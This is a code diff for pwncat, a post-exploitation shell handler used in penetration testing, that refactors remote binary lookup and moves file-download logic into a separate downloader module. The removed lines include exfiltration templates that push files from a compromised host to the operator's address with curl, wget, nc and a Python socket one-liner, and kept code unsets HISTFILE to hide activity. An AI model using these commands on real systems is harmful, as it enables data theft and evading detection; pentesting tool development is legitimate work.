@@ -13,6 +13,7 @@ import sys
 import os
 
 from pwncat import util
+from pwncat import downloader
 
 
 class State(enum.Enum):
@@ -33,20 +34,20 @@ class PtyHandler:
     }
 
     INTERESTING_BINARIES = [
-        ("python", "python", 9999),
-        ("python2", "python", 9998),
-        ("python3", "python", 10000),
-        ("perl", "perl", 0),
-        ("bash", "sh", 10000),
-        ("dash", "sh", 9999),
-        ("zsh", "sh", 9999),
-        ("sh", "sh", 0),
-        ("curl", "curl", 0),
-        ("wget", "wget", 0),
-        ("nc", "nc", 0),
-        ("netcat", "nc", 0),
-        ("ncat", "nc", 0),
-        ("script", "script", 0),
+        "python",
+        "python2",
+        "python3",
+        "perl",
+        "bash",
+        "dash",
+        "zsh",
+        "sh",
+        "curl",
+        "wget",
+        "nc",
+        "netcat",
+        "ncat",
+        "script",
     ]
 
     def __init__(self, client: socket.SocketType):
@@ -62,6 +63,18 @@ class PtyHandler:
         self.known_binaries = {}
         self.vars = {"lhost": None}
         self.prompt = PromptSession("localhost$ ")
+        self.binary_aliases = {
+            "python": [
+                "python2",
+                "python3",
+                "python2.7",
+                "python3.6",
+                "python3.8",
+                "python3.9",
+            ],
+            "sh": ["bash", "zsh", "dash"],
+            "nc": ["netcat", "ncat"],
+        }
 
         # We should always get a response within 3 seconds...
         self.client.settimeout(3)
@@ -77,26 +90,24 @@ class PtyHandler:
         self.recvuntil(b"\n")
 
         # Locate interesting binaries
-        for name, friendly, priority in PtyHandler.INTERESTING_BINARIES:
+        # The auto-resolving doesn't work correctly until we have a pty
+        # so, we manually resolve a list of useful binaries prior to spawning
+        # a pty
+        for name in PtyHandler.INTERESTING_BINARIES:
             util.info(f"resolving remote binary: {name}", overlay=True)
-
-            # We already found a preferred option
-            if (
-                friendly in self.known_binaries
-                and self.known_binaries[friendly][1] > priority
-            ):
-                continue
 
             # Look for the given binary
             response = self.run(f"which {shlex.quote(name)}", has_pty=False)
             if response == b"":
                 continue
 
-            self.known_binaries[friendly] = (response.decode("utf-8"), priority)
+            self.known_binaries[name] = response.decode("utf-8")
 
+        # Now, we can resolve using `which` w/ request=False for the different
+        # methods
         for m, cmd in PtyHandler.OPEN_METHODS.items():
-            if m in self.known_binaries:
-                method_cmd = cmd.format(self.known_binaries[m][0])
+            if self.which(m, request=False) is not None:
+                method_cmd = cmd.format(self.which(m, request=False))
                 method = m
                 break
         else:
@@ -107,7 +118,8 @@ class PtyHandler:
         util.info(f"opening pseudoterminal via {method}", overlay=True)
         client.sendall(method_cmd.encode("utf-8") + b"\n")
 
-        # Make sure HISTFILE is unset in this PTY
+        # Make sure HISTFILE is unset in this PTY (it resets when a pty is
+        # opened)
         self.run("unset HISTFILE")
 
         # Synchronize the terminals
@@ -116,6 +128,32 @@ class PtyHandler:
 
         # Force the local TTY to enter raw mode
         self.enter_raw()
+
+    def which(self, name: str, request=True) -> str:
+        """ Call which on the remote host and return the path. The results are
+        cached to decrease the number of remote calls. """
+        path = None
+
+        if name in self.known_binaries and self.known_binaries[name] is not None:
+            # Cached value available
+            path = self.known_binaries[name]
+        elif name not in self.known_binaries and request:
+            # It hasn't been looked up before, request it.
+            path = self.run(f"which {shlex.quote(name)}").decode("utf-8")
+            if path == "":
+                path = None
+
+        if name in self.binary_aliases and path is None:
+            # Look for aliases of this command as a last resort
+            for alias in self.binary_aliases[name]:
+                path = self.which(alias)
+                if path is not None:
+                    break
+
+        # Cache the value
+        self.known_binaries[name] = path
+
+        return path
 
     def process_input(self, data: bytes):
         r""" Process a new byte of input from stdin. This is to catch "\r~C" and open
@@ -205,28 +243,10 @@ class PtyHandler:
 
     def do_download(self, argv):
 
-        uploaders = {
-            "curl": (
-                "http",
-                "{cmd} -X POST --data @{remote_file} http://{lhost}:{lport}/{lfile}",
-            ),
-            "XXXX": (
-                "http",
-                "{cmd} --post-file {remote_file} http://{lhost}:{lport}/{lfile}",
-            ),
-            "nc": ("raw", "nc {lhost} {lport} < {remote_file}"),
-            "python": (
-                "raw",
-                """{cmd} -c 'from socket import AF_INET, socket, SOCK_STREAM; import shutil; s=socket(AF_INET, SOCK_STREAM); s.connect(("{lhost}", {lport})); fp = open("{remote_file}", "rb"); shutil.copyfileobj(fp, s.makefile("wb", buffering=0))'""",
-            ),
-        }
-        servers = {"http": util.receive_http_file, "raw": util.receive_raw_file}
-
         parser = argparse.ArgumentParser(prog="download")
         parser.add_argument(
             "--method",
             "-m",
-            choices=uploaders.keys(),
             default=None,
             help="set the download method (default: auto)",
         )
@@ -244,31 +264,19 @@ class PtyHandler:
             # The arguments were parsed incorrectly, return.
             return
 
-        if self.vars.get("lhost", None) is None:
-            util.error("[!] you must provide an lhost address for reverse connections!")
+        try:
+            # Locate an appropriate downloader class
+            DownloaderClass = downloader.find(self, args.method)
+        except downloader.DownloadError as exc:
+            util.error(f"{exc}")
             return
 
-        if args.method is not None and args.method not in self.known_binaries:
-            util.error(f"{args.method}: method unavailable")
-        elif args.method is not None:
-            method = uploaders[args.method]
-        else:
-            method = None
-            for m, info in uploaders.items():
-                if m in self.known_binaries:
-                    util.info(f"downloading via {m}")
-                    method = info
-                    args.method = m
-                    break
-            else:
-                util.warn(
-                    "no available download methods. falling back to dd/base64 method"
-                )
-
+        # Grab the arguments
         path = args.path
         basename = os.path.basename(args.path)
-        name = basename
         outfile = args.output.format(basename=basename)
+
+        download = DownloaderClass(self, remote_path=path, local_path=outfile)
 
         # Get the remote file size
         size = self.run(f'stat -c "%s" {shlex.quote(path)} 2>/dev/null || echo "none"')
@@ -277,7 +285,7 @@ class PtyHandler:
             return
         size = int(size)
 
-        with ProgressBar("downloading") as pb:
+        with ProgressBar(f"downloading with {download.NAME}") as pb:
 
             counter = pb(range(os.path.getsize(path)))
             last_update = time.time()
@@ -291,32 +299,9 @@ class PtyHandler:
                 if (time.time() - last_update) > 0.1:
                     pb.invalidate()
 
-            if method is not None:
-                server = servers[method[0]](outfile, name, progress=on_progress)
+            download.serve(on_progress)
 
-                command = method[1].format(
-                    cmd=self.known_binaries[args.method][0],
-                    remote_file=shlex.quote(path),
-                    lhost=self.vars["lhost"],
-                    lfile=name,
-                    lport=server.server_address[1],
-                )
-                result = self.run(command, wait=False)
-            else:
-                server = None
-                path = shlex.quote(path)
-                with open(outfile, "wb") as fp:
-                    copied = 0
-                    blocksz = 1024 * 10
-                    for chunk_nr in range(0, size // blocksz):
-                        # Send the command
-                        encoded = self.run(
-                            f"dd if={path} bs={blocksz} count=1 skip={chunk_nr} 2>/dev/null | base64 -w0",
-                        )
-                        chunk = base64.b64decode(encoded)
-                        fp.write(chunk)
-                        copied += len(chunk)
-                        on_progress(copied, len(chunk))
+            download.command()
 
             try:
                 while not counter.done:
@@ -324,8 +309,7 @@ class PtyHandler:
             except KeyboardInterrupt:
                 pass
             finally:
-                if server is not None:
-                    server.shutdown()
+                download.shutdown()
 
             # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
             time.sleep(0.1)
@@ -460,7 +444,12 @@ class PtyHandler:
         parser = argparse.ArgumentParser(prog="set")
         parser.add_argument("variable", help="the variable name")
         parser.add_argument("value", help="the new variable type")
-        args = parser.parse_args(argv)
+
+        try:
+            args = parser.parse_args(argv)
+        except SystemExit:
+            # The arguments were parsed incorrectly, return.
+            return
 
         self.vars[args.variable] = args.value
 
